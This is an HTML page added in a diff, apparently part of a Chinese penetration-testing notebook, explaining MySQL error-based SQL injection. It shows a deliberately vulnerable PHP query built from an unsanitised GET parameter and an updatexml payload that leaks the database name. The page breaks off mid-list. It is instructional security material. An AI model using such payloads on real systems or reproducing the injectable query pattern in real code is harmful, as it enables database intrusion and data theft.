@@ -1,0 +1,1584 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>报错注入 · Java</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Mpy">
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="布尔盲注.html" />
+    
+    
+    <link rel="prev" href="DNSLog注入.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../信息收集/">
+            
+                <a href="../../信息收集/">
+            
+                    
+                    信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../信息收集/域名信息收集/">
+            
+                <a href="../../信息收集/域名信息收集/">
+            
+                    
+                    域名信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../信息收集/域名信息收集/WhoIs查询.html">
+            
+                <a href="../../信息收集/域名信息收集/WhoIs查询.html">
+            
+                    
+                    WhoIs查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../信息收集/域名信息收集/备案信息.html">
+            
+                <a href="../../信息收集/域名信息收集/备案信息.html">
+            
+                    
+                    备案查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../信息收集/域名信息收集/信用信息查询.html">
+            
+                <a href="../../信息收集/域名信息收集/信用信息查询.html">
+            
+                    
+                    信用信息查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../信息收集/应用信息收集/">
+            
+                <a href="../../信息收集/应用信息收集/">
+            
+                    
+                    应用信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../../信息收集/应用信息收集/应用信息收集.html">
+            
+                <a href="../../信息收集/应用信息收集/应用信息收集.html">
+            
+                    
+                    应用收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../../信息收集/子域名信息收集/">
+            
+                <a href="../../信息收集/子域名信息收集/">
+            
+                    
+                    子域名信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../信息收集/子域名信息收集/DNS历史记录.html">
+            
+                <a href="../../信息收集/子域名信息收集/DNS历史记录.html">
+            
+                    
+                    DNS历史记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="../../信息收集/子域名信息收集/网站收集.html">
+            
+                <a href="../../信息收集/子域名信息收集/网站收集.html">
+            
+                    
+                    网站收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.3" data-path="../../信息收集/子域名信息收集/IP反查.html">
+            
+                <a href="../../信息收集/子域名信息收集/IP反查.html">
+            
+                    
+                    IP反查
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.4" data-path="../../信息收集/子域名信息收集/权重综合查询.html">
+            
+                <a href="../../信息收集/子域名信息收集/权重综合查询.html">
+            
+                    
+                    权重综合查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.5" data-path="../../信息收集/子域名信息收集/GoogleHack.html">
+            
+                <a href="../../信息收集/子域名信息收集/GoogleHack.html">
+            
+                    
+                    GoogleHack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.6" data-path="../../信息收集/子域名信息收集/Shodan.html">
+            
+                <a href="../../信息收集/子域名信息收集/Shodan.html">
+            
+                    
+                    Shodan
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.7" data-path="../../信息收集/子域名信息收集/浏览器插件.html">
+            
+                <a href="../../信息收集/子域名信息收集/浏览器插件.html">
+            
+                    
+                    浏览器插件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.8" data-path="../../信息收集/子域名信息收集/证书查询.html">
+            
+                <a href="../../信息收集/子域名信息收集/证书查询.html">
+            
+                    
+                    证书查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.9" data-path="../../信息收集/子域名信息收集/工具查找.html">
+            
+                <a href="../../信息收集/子域名信息收集/工具查找.html">
+            
+                    
+                    工具查找
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../../信息收集/指纹识别/">
+            
+                <a href="../../信息收集/指纹识别/">
+            
+                    
+                    指纹识别
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../../信息收集/指纹识别/指纹识别.html">
+            
+                <a href="../../信息收集/指纹识别/指纹识别.html">
+            
+                    
+                    指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../../信息收集/端口收集/">
+            
+                <a href="../../信息收集/端口收集/">
+            
+                    
+                    端口扫描
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../信息收集/端口收集/网络空间搜索.html">
+            
+                <a href="../../信息收集/端口收集/网络空间搜索.html">
+            
+                    
+                    网络空间搜索
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../信息收集/端口收集/浏览器插件.html">
+            
+                <a href="../../信息收集/端口收集/浏览器插件.html">
+            
+                    
+                    浏览器插件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../信息收集/端口收集/工具.html">
+            
+                <a href="../../信息收集/端口收集/工具.html">
+            
+                    
+                    工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../../信息收集/敏感文件/">
+            
+                <a href="../../信息收集/敏感文件/">
+            
+                    
+                    敏感文件
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../../信息收集/敏感文件/源码泄露.html">
+            
+                <a href="../../信息收集/敏感文件/源码泄露.html">
+            
+                    
+                    源码泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../../信息收集/敏感文件/备份文件泄露.html">
+            
+                <a href="../../信息收集/敏感文件/备份文件泄露.html">
+            
+                    
+                    备份文件泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.3" data-path="../../信息收集/敏感文件/WAF识别.html">
+            
+                <a href="../../信息收集/敏感文件/WAF识别.html">
+            
+                    
+                    WAF识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.4" data-path="../../信息收集/敏感文件/JS获取敏感接口.html">
+            
+                <a href="../../信息收集/敏感文件/JS获取敏感接口.html">
+            
+                    
+                    JS获取敏感接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.5" data-path="../../信息收集/敏感文件/目录后台.html">
+            
+                <a href="../../信息收集/敏感文件/目录后台.html">
+            
+                    
+                    目录后台
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.6" data-path="../../信息收集/敏感文件/公网网盘.html">
+            
+                <a href="../../信息收集/敏感文件/公网网盘.html">
+            
+                    
+                    公网网盘
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.7" data-path="../../信息收集/敏感文件/公开文件.html">
+            
+                <a href="../../信息收集/敏感文件/公开文件.html">
+            
+                    
+                    公开文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.8" data-path="../../信息收集/敏感文件/邮箱收集.html">
+            
+                <a href="../../信息收集/敏感文件/邮箱收集.html">
+            
+                    
+                    邮箱收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.9" data-path="../../信息收集/敏感文件/历史网站.html">
+            
+                <a href="../../信息收集/敏感文件/历史网站.html">
+            
+                    
+                    历史网站
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.10" data-path="../../信息收集/敏感文件/查找真实IP.html">
+            
+                <a href="../../信息收集/敏感文件/查找真实IP.html">
+            
+                    
+                    查找真实IP
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../../信息收集/漏洞公共库/">
+            
+                <a href="../../信息收集/漏洞公共库/">
+            
+                    
+                    漏洞公共库
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.7.1" data-path="../../信息收集/漏洞公共库/国内.html">
+            
+                <a href="../../信息收集/漏洞公共库/国内.html">
+            
+                    
+                    国内
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7.2" data-path="../../信息收集/漏洞公共库/国外.html">
+            
+                <a href="../../信息收集/漏洞公共库/国外.html">
+            
+                    
+                    国外
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../../信息收集/社工库/">
+            
+                <a href="../../信息收集/社工库/">
+            
+                    
+                    社工库
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.8.1" data-path="../../信息收集/社工库/用户注册信息.html">
+            
+                <a href="../../信息收集/社工库/用户注册信息.html">
+            
+                    
+                    用户注册信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8.2" data-path="../../信息收集/社工库/IP信息.html">
+            
+                <a href="../../信息收集/社工库/IP信息.html">
+            
+                    
+                    IP信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8.3" data-path="../../信息收集/社工库/社工库.html">
+            
+                <a href="../../信息收集/社工库/社工库.html">
+            
+                    
+                    社工库
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8.4" data-path="../../信息收集/社工库/工具.html">
+            
+                <a href="../../信息收集/社工库/工具.html">
+            
+                    
+                    工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../Access数据库/">
+            
+                <a href="../Access数据库/">
+            
+                    
+                    Access
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../Access数据库/偏移注入.html">
+            
+                <a href="../Access数据库/偏移注入.html">
+            
+                    
+                    偏移注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="../Access数据库/Cookie注入.html">
+            
+                <a href="../Access数据库/Cookie注入.html">
+            
+                    
+                    Cookie注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../MssQL数据库/">
+            
+                <a href="../MssQL数据库/">
+            
+                    
+                    MssQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="../MssQL数据库/反弹注入.html">
+            
+                <a href="../MssQL数据库/反弹注入.html">
+            
+                    
+                    反弹注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="../MssQL数据库/显错注入.html">
+            
+                <a href="../MssQL数据库/显错注入.html">
+            
+                    
+                    显错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    MySQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1" data-path="Head注入.html">
+            
+                <a href="Head注入.html">
+            
+                    
+                    Head注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.2" data-path="显错注入.html">
+            
+                <a href="显错注入.html">
+            
+                    
+                    显错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.3" data-path="base64注入.html">
+            
+                <a href="base64注入.html">
+            
+                    
+                    base64注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.4" data-path="DNSLog注入.html">
+            
+                <a href="DNSLog注入.html">
+            
+                    
+                    DNSLog注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3.3.5" data-path="报错注入.html">
+            
+                <a href="报错注入.html">
+            
+                    
+                    报错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.6" data-path="布尔盲注.html">
+            
+                <a href="布尔盲注.html">
+            
+                    
+                    布尔盲注
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.7" data-path="堆叠查询.html">
+            
+                <a href="堆叠查询.html">
+            
+                    
+                    堆叠查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.8" data-path="二次注入.html">
+            
+                <a href="二次注入.html">
+            
+                    
+                    二次注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.9" data-path="宽字节注入.html">
+            
+                <a href="宽字节注入.html">
+            
+                    
+                    宽字节注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.10" data-path="延时盲注.html">
+            
+                <a href="延时盲注.html">
+            
+                    
+                    延时盲注
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../Oracle数据库/">
+            
+                <a href="../Oracle数据库/">
+            
+                    
+                    Oracle
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1" data-path="../Oracle数据库/报错注入.html">
+            
+                <a href="../Oracle数据库/报错注入.html">
+            
+                    
+                    报错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.2" data-path="../Oracle数据库/显错注入.html">
+            
+                <a href="../Oracle数据库/显错注入.html">
+            
+                    
+                    显错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../跨站伪造/">
+            
+                <a href="../../跨站伪造/">
+            
+                    
+                    跨站伪造
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../../跨站伪造/XSS.html">
+            
+                <a href="../../跨站伪造/XSS.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../../跨站伪造/CSRF.html">
+            
+                <a href="../../跨站伪造/CSRF.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../../跨站伪造/SSRF.html">
+            
+                <a href="../../跨站伪造/SSRF.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../文件上传/">
+            
+                <a href="../../文件上传/">
+            
+                    
+                    文件上传
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../文件上传/文件上传.html">
+            
+                <a href="../../文件上传/文件上传.html">
+            
+                    
+                    文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../../逻辑漏洞/">
+            
+                <a href="../../逻辑漏洞/">
+            
+                    
+                    逻辑漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../../逻辑漏洞/XXE.html">
+            
+                <a href="../../逻辑漏洞/XXE.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../../逻辑漏洞/变量覆盖.html">
+            
+                <a href="../../逻辑漏洞/变量覆盖.html">
+            
+                    
+                    变量覆盖
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../../逻辑漏洞/文件包含.html">
+            
+                <a href="../../逻辑漏洞/文件包含.html">
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../../ByPass/">
+            
+                <a href="../../ByPass/">
+            
+                    
+                    ByPass
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../ByPass/WebShell绕过.html">
+            
+                <a href="../../ByPass/WebShell绕过.html">
+            
+                    
+                    ByPass
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../../kali的使用/">
+            
+                <a href="../../kali的使用/">
+            
+                    
+                    kali
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../../kali的使用/kali配置.html">
+            
+                <a href="../../kali的使用/kali配置.html">
+            
+                    
+                    kali配置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../../kali的使用/Ettercap.html">
+            
+                <a href="../../kali的使用/Ettercap.html">
+            
+                    
+                    Ettercap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../../kali的使用/HashCat.html">
+            
+                <a href="../../kali的使用/HashCat.html">
+            
+                    
+                    HashCat
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../../kali的使用/Nmap.html">
+            
+                <a href="../../kali的使用/Nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../../kali的使用/SQLMap.html">
+            
+                <a href="../../kali的使用/SQLMap.html">
+            
+                    
+                    SQLMap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../../kali的使用/WireShark.html">
+            
+                <a href="../../kali的使用/WireShark.html">
+            
+                    
+                    WireShark
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >报错注入</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-anchor"></i><ul><li><span class="title-icon "></span><a href="#&#x4EE3;&#x7801;&#x5206;&#x6790;"><b></b>&#x4EE3;&#x7801;&#x5206;&#x6790;</a></li><li><span class="title-icon "></span><a href="#updatexml"><b></b>updatexml</a></li></ul></div><a href="#&#x4EE3;&#x7801;&#x5206;&#x6790;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="&#x4EE3;&#x7801;&#x5206;&#x6790;"><a name="&#x4EE3;&#x7801;&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#&#x4EE3;&#x7801;&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4EE3;&#x7801;&#x5206;&#x6790;</h1>
+<pre><code>&lt;?php
+$con = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;test&quot;);
+if (mysqli_connect_errno()){
+    echo &quot;&#x8FDE;&#x63A5;&#x5931;&#x8D25;&quot; . mysqli_connect_errno();
+}
+$username = $_GET[&apos;username&apos;];
+if ($result = mysqli_query($con, &quot;select * from users where &apos;username&apos; =&apos;&quot;. $username . &quot;&apos;&quot;){
+    echo &quot;yes&quot;;
+}else{
+    echo mysqli_error($con);
+}
+?&gt;
+</code></pre><ul>
+<li>&#x8F93;&#x5165; ==username=1&apos;== &#x65F6;&#xFF0C;SQL&#x8BED;&#x53E5;&#x4E3A;<code>select * from users where &apos;username&apos;=&apos;1&apos;&apos;</code>&#xFF0C;&#x6267;&#x884C;&#x65F6;&#x4F1A;&#x56E0;&#x4E3A;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#x62A5;&#x9519;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x62A5;&#x9519;&#x8FDB;&#x884C;&#x6CE8;&#x5165;<ul>
+<li>&#x5229;&#x7528;&#x7279;&#x6B8A;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x8BA9;&#x539F;&#x6709;&#x7684;&#x8BED;&#x53E5;&#x51FA;&#x73B0;&#x81F4;&#x547D;&#x6027;&#x9519;&#x8BEF;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x4E2D;&#x542B;&#x6709;&#x4F60;&#x60F3;&#x8981;&#x7684;&#x6570;&#x636E;</li>
+</ul>
+</li>
+</ul>
+<h1 id="updatexml"><a name="updatexml" class="anchor-navigation-ex-anchor" href="#updatexml"><i class="fa fa-link" aria-hidden="true"></i></a>updatexml</h1>
+<blockquote>
+<p>updatexml(&#x76EE;&#x6807;xml&#x5185;&#x5BB9;, xml&#x6587;&#x6863;&#x8DEF;&#x5F84;, &#x66F4;&#x65B0;&#x7684;&#x5185;&#x5BB9;)</p>
+</blockquote>
+<ul>
+<li>&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x53BB;<code>&#x66F4;&#x65B0;XML&#x6587;&#x6863;</code>&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x5728;<code>XML&#x6587;&#x6863;&#x7684;&#x8DEF;&#x5F84;&#x7684;&#x4F4D;&#x7F6E;&#x91CC;&#x9762;&#x5199;&#x5165;&#x5B50;&#x67E5;&#x8BE2;</code>&#xFF0C;&#x901A;&#x8FC7;<code>&#x8F93;&#x5165;&#x7279;&#x6B8A;&#x5B57;&#x7B26;</code>&#xFF0C;<code>&#x6587;&#x6863;&#x8DEF;&#x5F84;&#x4E0D;&#x7B26;&#x5408;&#x89C4;&#x77E9;&#x8FDB;&#x884C;&#x62A5;&#x9519;</code>&#xFF0C;&#x62A5;&#x9519;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x5DF2;&#x7ECF;&#x5728;&#x6267;&#x884C;&#x90A3;&#x4E2A;&#x5B50;&#x67E5;&#x8BE2;&#x4E86;&#xFF0C;</li>
+<li>&#x4E3B;&#x8981;&#x76EE;&#x7684;&#x662F;&#x8BA9;xml&#x7684;&#x6587;&#x6863;&#x8DEF;&#x5F84;&#x62A5;&#x9519;&#xFF0C;&#x6240;&#x4EE5;xml&#x7684;&#x5185;&#x5BB9;&#x548C;&#x66F4;&#x65B0;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x968F;&#x4FBF;&#x5199;&#xFF0C;&#x5982;&#x591A;&#x8C22;&#x5B57;&#x7B26;&#x4E32;&#x8981;&#x52A0;&#x5355;&#x5F15;&#x53F7;</li>
+<li>&#x60F3;&#x8981;&#x8BA9;&#x8DEF;&#x5F84;&#x62A5;&#x9519;&#xFF0C;&#x5FC5;&#x987B;&#x5F97;&#x52A0;&#x4E0A;&#x7279;&#x6B8A;&#x7B26;&#x53F7;&#x6216;&#x8005;16&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x7684;&#x7279;&#x6B8A;&#x7B26;&#x53F7;&#xFF0C;&#x7136;&#x540E;&#x62FC;&#x63A5;&#x5230;&#x4E00;&#x8D77;&#xFF08;concat&#x51FD;&#x6570;&#x5C31;&#x662F;&#x62FC;&#x63A5;&#x591A;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x5728;&#x4E00;&#x8D77;&#xFF09;<ul>
+<li>&#x5B8C;&#x6574;&#x8BED;&#x53E5;&#xFF1A;<br><pre><code>&apos;&apos; or updatexml(1,concat(0x73, (select database())),2)# (&#x8FD9;&#x91CC;or&#x4E0D;&#x884C;&#x8BD5;&#x4E00;&#x8BD5;and)`&lt;br&gt;
+`ERROR 1105 (HY000): XPATH syntax error: &apos;~test&apos;&#x8FD9;&#x6837;&#x5C31;&#x62A5;&#x9519;&#x51FA;&#x4E86;&#x5E93;&#x540D;
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h3 id="extractvalue"><a name="extractvalue" class="anchor-navigation-ex-anchor" href="#extractvalue"><i class="fa fa-link" aria-hidden="true"></i></a>extractvalue</h3>
+<ul>
+<li>&#x67E5;&#x8BE2;&#x5185;&#x5BB9;</li>
+</ul>
+<blockquote>
+<p>extractvalue(&#x76EE;&#x6807;xml&#x6587;&#x6863;&#xFF0C;xml&#x8DEF;&#x5F84;)</p>
+</blockquote>
+<ul>
+<li>&#x548C;updatexml&#x4E00;&#x6837;&#xFF0C;&#x5C31;&#x662F;&#x53C2;&#x6570;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x7528;&#x6CD5;&#x5B8C;&#x5168;&#x4E00;&#x6837;</li>
+</ul>
+<p>MySQL&#x7684;&#x62A5;&#x9519;SQL&#x6CE8;&#x5165;&#x65B9;&#x6CD5;
+MySQL&#x7684;&#x62A5;&#x9519;SQL&#x6CE8;&#x5165;&#x65B9;&#x6CD5;
+&#x591A;&#x6570;&#x4EBA;&#x4EE5;&#x4E3A;&#x53EA;&#x6709;&#x4E09;&#x79CD;
+&#x5B9E;&#x9645;&#x4E0A;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x4E2A;&#x51FD;&#x6570;&#x90FD;&#x4F1A;&#x5BFC;&#x81F4;MySQL&#x62A5;&#x9519;&#x5E76;&#x4E14;&#x663E;&#x793A;&#x51FA;&#x6570;&#x636E;
+&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x6765;&#x8BF4;&#x660E;&#x5229;&#x7528;
+&#x591A;&#x6570;&#x4EBA;&#x4EE5;&#x4E3A;&#x53EA;&#x6709;&#x4E09;&#x79CD;</p>
+<ol>
+<li>floor()</li>
+<li>updatexml()</li>
+<li>extractvalue()
